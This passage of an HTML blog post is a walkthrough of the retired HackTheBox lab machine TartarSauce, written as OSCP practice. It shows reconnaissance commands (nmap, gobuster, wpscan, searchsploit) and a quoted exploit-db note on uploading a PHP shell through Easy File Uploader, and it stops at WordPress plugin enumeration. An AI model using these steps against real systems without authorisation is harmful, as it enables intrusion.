@@ -1,0 +1,1896 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Walkthrough of the retired HackTheBox machine, TartarSauce!'>
+<title>HackTheBox TartarSauce Walkthrough (w/o Metasploit)</title>
+
+<link rel='canonical' href='https://novaah.xyz/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/'>
+
+<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='HackTheBox TartarSauce Walkthrough (w/o Metasploit)'>
+<meta property='og:description' content='Walkthrough of the retired HackTheBox machine, TartarSauce!'>
+<meta property='og:url' content='https://novaah.xyz/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/'>
+<meta property='og:site_name' content='novaah.xyz'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='HackTheBox' /><meta property='article:tag' content='WordPress' /><meta property='article:tag' content='RFI' /><meta property='article:tag' content='CVE-2021-4034' /><meta property='article:published_time' content='2022-11-20T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-11-20T00:00:00&#43;00:00'/><meta property='og:image' content='https://novaah.xyz/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/TartarSauce.png' />
+<meta name="twitter:title" content="HackTheBox TartarSauce Walkthrough (w/o Metasploit)">
+<meta name="twitter:description" content="Walkthrough of the retired HackTheBox machine, TartarSauce!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://novaah.xyz/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/TartarSauce.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/pfp_hu11076ffe2a4d17cdab0fd62230a41504_20919_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">novaah.xyz</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='mailto:aaron@novaah.xyz'
+                        target="_blank"
+                        title="Email"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-at" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="#2c3e50" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <circle cx="12" cy="12" r="4" />
+  <path d="M16 12v1.5a2.5 2.5 0 0 0 5 0v-1.5a9 9 0 1 0 -5.5 8.28" />
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://infosec.exchange/@novaah'
+                        target="_blank"
+                        title="Mastodon"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-affiliate" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="#2c3e50" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M5.931 6.936l1.275 4.249m5.607 5.609l4.251 1.275" />
+  <path d="M11.683 12.317l5.759 -5.759" />
+  <circle cx="5.5" cy="5.5" r="1.5" />
+  <circle cx="18.5" cy="5.5" r="1.5" />
+  <circle cx="18.5" cy="18.5" r="1.5" />
+  <circle cx="8.5" cy="15.5" r="4.5" />
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://aaronwasserman.com'
+                        target="_blank"
+                        title="Personal Site"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/AaronJWasserman'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#scanning--enumeration">Scanning &amp; Enumeration</a>
+      <ol>
+        <li><a href="#nmap">nmap</a></li>
+        <li><a href="#robotstxt-entries">robots.txt entries</a></li>
+        <li><a href="#gobuster">Gobuster</a></li>
+        <li><a href="#wordpress">WordPress</a>
+          <ol>
+            <li><a href="#wp-plugins">WP Plugins</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#gaining-access">Gaining Access</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ol>
+        <li><a href="#initial-enumeration">Initial Enumeration</a></li>
+        <li><a href="#escalation-to-onuma">Escalation to onuma</a>
+          <ol>
+            <li><a href="#user-flag">User Flag</a></li>
+          </ol>
+        </li>
+        <li><a href="#escalation-to-root">Escalation to root</a>
+          <ol>
+            <li><a href="#root-flag">Root Flag</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#additional-notes">Additional Notes</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/">
+                <img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/TartarSauce_hufe7d54287eff7aef2597e1d91d9fe2e2_342707_800x0_resize_box_3.png"
+                        srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/TartarSauce_hufe7d54287eff7aef2597e1d91d9fe2e2_342707_800x0_resize_box_3.png 800w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/TartarSauce_hufe7d54287eff7aef2597e1d91d9fe2e2_342707_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="606" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox TartarSauce Walkthrough (w/o Metasploit)" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hackthebox/" >
+                HackTheBox
+            </a>
+        
+            <a href="/categories/walkthroughs/" >
+                Walkthroughs
+            </a>
+        
+            <a href="/categories/oscp-prep/" >
+                OSCP Prep
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/">HackTheBox TartarSauce Walkthrough (w/o Metasploit)</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Walkthrough of the retired HackTheBox machine, TartarSauce!
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Nov 20, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    14 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="introduction">Introduction</h2>
+<p>Hi! Welcome to my second HackTheBox walkthrough of the retired machine, TartarSauce! I’m currently preparing to take the OSCP certification exam and decided to tackle TJ_Null’s OSCP-like VMs list! This is a medium difficulty Linux box with a handful of fun jokes/easter eggs from the author.
+<img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/tjnull.png"
+	width="1024"
+	height="884"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/tjnull_hu45e55bc055549457fd2d16d0983ec15a_158427_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/tjnull_hu45e55bc055549457fd2d16d0983ec15a_158427_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="TJ_Null OSCP List"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="115"
+		data-flex-basis="278px"
+	
+>
+Since I am doing this in preparation for the OSCP exam where Metasploit usage is restricted, I didn’t use Metasploit while completing this box (but I didn&rsquo;t even see any opportunity to).</p>
+<h2 id="scanning--enumeration">Scanning &amp; Enumeration</h2>
+<p>Upon launching the machine on HackTheBox, we are given the IP <code>10.10.10.88</code></p>
+<h3 id="nmap">nmap</h3>
+<p>I started off by running a quick nmap scan to give myself some leads to start following while waiting for a more intensive scan to run.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -Pn 10.10.10.88
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/ts-quick-nmap.png"
+	width="514"
+	height="174"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/ts-quick-nmap_hu31146e54468450e848e24243fd081f0f_22992_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/ts-quick-nmap_hu31146e54468450e848e24243fd081f0f_22992_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Quick nmap scan"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="295"
+		data-flex-basis="708px"
+	
+><br>
+Looks like there is a web server! Let&rsquo;s start a more intensive scan and check out the site while the scan runs.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -Pn -A -v -p- 10.10.10.88
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/ts-site.png"
+	width="1251"
+	height="1285"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/ts-site_hub7a02f94f540823066d79cbfc7fb225b_181370_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/ts-site_hub7a02f94f540823066d79cbfc7fb225b_181370_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="TartarSauce Site"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="97"
+		data-flex-basis="233px"
+	
+><br>
+I love some good ASCII art, but this isn&rsquo;t doing too much for us. Let&rsquo;s take a peek at source for the page.
+<img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/ts-source.png"
+	width="1216"
+	height="1055"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/ts-source_hube3c7dbc6851ab2b9f035fdbccc3aeee_177472_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/ts-source_hube3c7dbc6851ab2b9f035fdbccc3aeee_177472_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Site source"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="115"
+		data-flex-basis="276px"
+	
+><br>
+<img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/easter-egg.png"
+	width="350"
+	height="124"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/easter-egg_hu1dd7d5a615c86dafa041c5a8a9576f11_7632_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/easter-egg_hu1dd7d5a615c86dafa041c5a8a9576f11_7632_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Easter Egg"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="282"
+		data-flex-basis="677px"
+	
+><br>
+Besides a fun easter egg, there also doesn&rsquo;t seem to be anything of interest. Let&rsquo;s see if our nmap scan is done&hellip;
+<img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/ts-intensive-nmap.png"
+	width="764"
+	height="822"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/ts-intensive-nmap_hufd93fae2a27ed6fd711c9a4d7afb0967_362865_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/ts-intensive-nmap_hufd93fae2a27ed6fd711c9a4d7afb0967_362865_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Intensive scan"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="92"
+		data-flex-basis="223px"
+	
+><br>
+It is, and we notice some interesting robots.txt entries. Let&rsquo;s take a look.</p>
+<h3 id="robotstxt-entries">robots.txt entries</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">User-agent: *
+</span></span><span class="line"><span class="cl">Disallow: /webservices/tar/tar/source/
+</span></span><span class="line"><span class="cl">Disallow: /webservices/monstra-3.0.4/
+</span></span><span class="line"><span class="cl">Disallow: /webservices/easy-file-uploader/
+</span></span><span class="line"><span class="cl">Disallow: /webservices/developmental/
+</span></span><span class="line"><span class="cl">Disallow: /webservices/phpmyadmin/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This gives us lots of information to work with! (also tar/tar/source == tartar sauce lol)</p>
+<p>We saw an entry for monstra CMS. Let&rsquo;s check searchsploit for it.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">searchsploit monstra 3.0.4
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/monstra-ss.png"
+	width="1241"
+	height="272"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/monstra-ss_hu0b3d8c726160a9082ec88a5813a919e9_181430_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/monstra-ss_hu0b3d8c726160a9082ec88a5813a919e9_181430_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Monstra Searchsploit"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="456"
+		data-flex-basis="1095px"
+	
+><br>
+There are definitely some vulnerabilities here. Let&rsquo;s check the other findings because nothing seems like our foothold just yet.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">searchsploit easy file uploader
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/easyfileupload.png"
+	width="1245"
+	height="198"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/easyfileupload_hu6b7fc24306168eec300ddf25a9c58509_51924_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/easyfileupload_hu6b7fc24306168eec300ddf25a9c58509_51924_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="EFU Searchsploit"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="628"
+		data-flex-basis="1509px"
+	
+><br>
+We see an entry for arbitrary file upload. Let&rsquo;s check that out further&hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Exploit Title: Easy File Uploader  - Arbitrary File Upload
+</span></span><span class="line"><span class="cl"># Date: 27/04/2017
+</span></span><span class="line"><span class="cl"># Exploit Author: Daniel Godoy
+</span></span><span class="line"><span class="cl"># Vendor Homepage: https://codecanyon.net/
+</span></span><span class="line"><span class="cl"># Software Link: https://codecanyon.net/item/easy-file-uploader-php-multiple-uploader-with-file-manager/17222287
+</span></span><span class="line"><span class="cl"># Tested on: GNU/Linux
+</span></span><span class="line"><span class="cl"># GREETZ: Rodrigo Mouri&lt;C3&gt;&lt;B1&gt;o, Rodrigo Avila, #RemoteExecution Team
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">POC
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Drop file php (shell.php) to upload.
+</span></span><span class="line"><span class="cl">access to http://poc_site/fileFolder/shell.php and enjoy!
+</span></span><span class="line"><span class="cl">/usr/share/exploitdb/exploits/php/webapps/41944.txt (END)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The software linked no longer exists. Let&rsquo;s keep searching.</p>
+<h3 id="gobuster">Gobuster</h3>
+<p>I&rsquo;ll run gobuster to see if there is anything we can find that wasn&rsquo;t disclosed in robots.txt.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gobuster dir -w /usr/share/wordlists/dirb/big.txt --url http://10.10.10.88
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/gobuster1.png"
+	width="779"
+	height="391"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/gobuster1_hu72a785a8981d36e5ab6a2e8f14e3f222_185007_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/gobuster1_hu72a785a8981d36e5ab6a2e8f14e3f222_185007_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="gobuster 1"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="199"
+		data-flex-basis="478px"
+	
+></p>
+<p>I&rsquo;ll also run it within the webservices directory</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gobuster dir -w /usr/share/wordlists/dirb/big.txt --url http://10.10.10.88/webservices/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/gobuster2.png"
+	width="769"
+	height="356"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/gobuster2_hu128ec5aa373625b0c53ea6907fdf673b_137927_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/gobuster2_hu128ec5aa373625b0c53ea6907fdf673b_137927_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="gobuster2"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="216"
+		data-flex-basis="518px"
+	
+><br>
+We see a /wp subdirectory that we didn&rsquo;t know about before. Could this be wordpress?<br>
+<img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/wp.png"
+	width="1255"
+	height="447"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/wp_hu849c0089f3e780c4355dcad46d8125a0_72637_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/wp_hu849c0089f3e780c4355dcad46d8125a0_72637_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="wordpress site"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="280"
+		data-flex-basis="673px"
+	
+><br>
+Yes, it is!</p>
+<h3 id="wordpress">WordPress</h3>
+<p>Let&rsquo;s run wpscan&hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wpscan --url 10.10.10.88/webservices/wp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/wpscan.png"
+	width="1246"
+	height="891"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/wpscan_hue1db17c21191270376ad7d2e0495c6e9_383680_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/wpscan_hue1db17c21191270376ad7d2e0495c6e9_383680_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="wpscan"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="139"
+		data-flex-basis="335px"
+	
+><br>
+A quick search for the Apache and Wordpress versions doesn&rsquo;t yield anything interesting in terms of initial foothold vectors. Let&rsquo;s scan all plugins instead of just the popular ones.</p>
+<h4 id="wp-plugins">WP Plugins</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wpscan --url http://10.10.10.88/webservices/wp --enumerate ap --plugins-detection aggressive 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/wp-plugins.png"
+	width="834"
+	height="713"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/wp-plugins_hu1645e23c81d992a1f45fa70a356ab283_351887_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/wp-plugins_hu1645e23c81d992a1f45fa70a356ab283_351887_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="wp plugins scan"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="116"
+		data-flex-basis="280px"
+	
+><br>
+That is more like it! I am totally unfamiliar with these so let&rsquo;s check out the readmes.</p>
+<h5 id="akismet-plugin">Akismet Plugin</h5>
+<p>http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
